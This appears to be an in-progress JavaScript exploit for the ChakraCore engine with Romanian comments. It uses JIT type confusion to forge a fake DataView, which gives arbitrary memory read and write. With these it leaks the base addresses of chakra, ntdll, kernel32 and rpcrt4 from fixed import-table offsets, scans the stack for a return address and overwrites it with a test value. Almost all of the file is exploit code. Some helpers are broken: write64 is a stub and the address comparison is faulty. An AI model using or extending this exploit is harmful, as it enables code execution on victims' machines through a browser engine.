var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
var f64 = new Float64Array(1);
var i32 = new Int32Array(f64.buffer);
var array_addr_hi, array_addr_lo;
var dv;

function SignedDwordToUnsignedDword(sd)
{
    return (sd < 0) ? sd + 0x100000000 : sd;
}

function opt(arr, proto, arr2) {
    arr[0] = 1.1;
    let tmp = {__proto__: proto};
    arr2[1] = fake_object; // 2.3023e-320;
    addr = arr[1];

    f64[0] = addr;
    var base_lo = i32[0];
    var base_hi = i32[1];

    i32[0] = base_lo + 0x58;
    arr[0] = f64[0];

    // Type*
    fake_object[2] = base_lo + 0x68;         fake_object[3] = base_hi;
    // (TypeId for fake Type object)
    fake_object[4] = 56;                     fake_object[5] = 0;
    // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
    fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
    // Buffer size
    fake_object[8] = 0x200;                  fake_object[9] = 0;
    // ArrayBuffer pointer, +0x3C IsDetached
    fake_object[10] = base_lo + 0x58 - 0x20 + 20; fake_object[11] = base_hi;
    // Buffer address
    fake_object[14] = base_lo + 0x58;        fake_object[15] = base_hi;
    array_addr_hi = base_hi;
    array_addr_lo = base_lo;

}

function u32_to_i32(x) {
    if (x >= 0x80000000) {
        return -(0x100000000 - x);
    }
    return x;
}

// Int32 to Uint32
function i32_to_u32(x) {
    if (x < 0) {
        return 0x100000000 + x;
    }
    return x;
}


function read32(addr_hi, addr_lo) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    return DataView.prototype.getInt32.call(dv, 0, true);
}

function read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    return {hi : higher_dword, lo : lower_dword };
}   

function print64(int64_value, message){
    print(message + '0x'+ i32_to_u32(int64_value.hi).toString(16) + i32_to_u32(int64_value.lo).toString(16).padStart(8, '0'));
}

function write32(addr_hi, addr_lo, value) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    DataView.prototype.setInt32.call(dv, 0, value, true);
}

function write64(addr_hi, addr_lo, value) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    print("i wrote stuff")
}

function main() {
    let arr = [1.1, 2.2, 3.3];
    let arr2 = [1.2, 2.3, 3.4];
    for (let i = 0; i < 10000; i++) {
        opt(arr, {}, arr2);
    }

    opt(arr, arr, arr);
    
    value = SignedDwordToUnsignedDword(array_addr_lo);
    value += SignedDwordToUnsignedDword(array_addr_hi) * 0x100000000;
    print(value.toString(16));

    value = SignedDwordToUnsignedDword(array_addr_lo+0x58);
    value += SignedDwordToUnsignedDword(array_addr_hi) * 0x100000000;
    print(value.toString(16));


    dv = arr[0];
    

    var chakra_leak = read64(array_addr_hi, array_addr_lo);
    

    value = SignedDwordToUnsignedDword(chakra_leak.lo);
    value += SignedDwordToUnsignedDword(chakra_leak.hi) * 0x100000000;
    print(value.toString(16));
    var chakra_base = value-0x000000000535450
    var chakra_base_de_folosit = { hi : chakra_leak.hi, lo : chakra_leak.lo - 0x000000000535450 };
    print(chakra_base.toString(16));

    ntdll_iat = { hi : chakra_base_de_folosit.hi, lo : chakra_base_de_folosit.lo + 0x04b6000};
    var ntdll_leak = read64(ntdll_iat.hi, ntdll_iat.lo);
    print64(ntdll_leak, "[*] ntdll_leak() @ ");

    ntdll_base = { hi : ntdll_leak.hi, lo : ntdll_leak.lo - 0x0000000000319a0};
    print64(ntdll_base, "[*] ntdll_base() @ ");

    //here the addition result in buggy yet we can corectly read off it so only print64 is buggy
    kernel_base_iat = { hi : chakra_base_de_folosit.hi, lo : chakra_base_de_folosit.lo + 0x04b6048};
    var kernel_leak = read64(kernel_base_iat.hi, kernel_base_iat.lo);
    print64(kernel_leak, "[*] kernel_leak() @ ");

    var kernel_base =  { hi : kernel_leak.hi, lo : kernel_leak.lo - 0x0010dd0};
    print64(kernel_base, "[*] kerne32_base() @ ");

    rpc4_base_iat = { hi : chakra_base_de_folosit.hi, lo : chakra_base_de_folosit.lo + 0x04b6520};    
    var rpc4_base_leak = read64(rpc4_base_iat.hi, rpc4_base_iat.lo);
    print64(rpc4_base_leak, "[*] rpc4_base_leak() @ ");

    var rpc4_base =  { hi : rpc4_base_leak.hi, lo : rpc4_base_leak.lo - 0x0cf5b0};
    print64(rpc4_base, "[*] rpc4_base() @ ");

   //00000000`00482352 return
   //00000000`00611008 ThreadContext::globalListFirst
   //4a8 sau 4b0
   globalListFirst = { hi : chakra_base_de_folosit.hi, lo : chakra_base_de_folosit.lo + 0x0611008 };
   print64(globalListFirst, "[*] globalListFirst() @ ");

   threadBuffer = read64(globalListFirst.hi, globalListFirst.lo);
   print64(threadBuffer, "[*] threadBuffer() @ ");

   stackaddr_usage = { hi : threadBuffer.hi, lo : threadBuffer.lo};
   print64(stackaddr_usage, "[*] stackaddr_usage() @ ");

   stackaddr = read64(stackaddr_usage.hi, stackaddr_usage.lo+0x4b0);
   print64(stackaddr, "[*] stackaddr() @ ");

   stackaddr_second =  { hi : stackaddr.hi, lo : stackaddr.lo};

   
   return_addr = { hi : chakra_base_de_folosit.hi, lo : chakra_base_de_folosit.lo+0x0482352}; //till here is good
   print64(return_addr, "[*] return_addr() @ ");
   while(true){
        value = read64(stackaddr_second.hi, stackaddr_second.lo);
        //print64(value, "[*] value() @ ");

        if(value == return_addr){
            print64(stackaddr_second, "[*] stackaddr() @ ");
            break;
        }
        stackaddr_second =  { hi : stackaddr_second.hi, lo : stackaddr_second.lo-0x8};
   }
   print("ie am iesit");
   print64(stackaddr_second, "[*] stackaddr() @ ");
   write32(stackaddr_second.hi, stackaddr_second.lo, 0x41414141)
    //kernel32-00000000`004b6048
    //rpc4-00000000`004b6520
    Math.sin(1);
}

main();
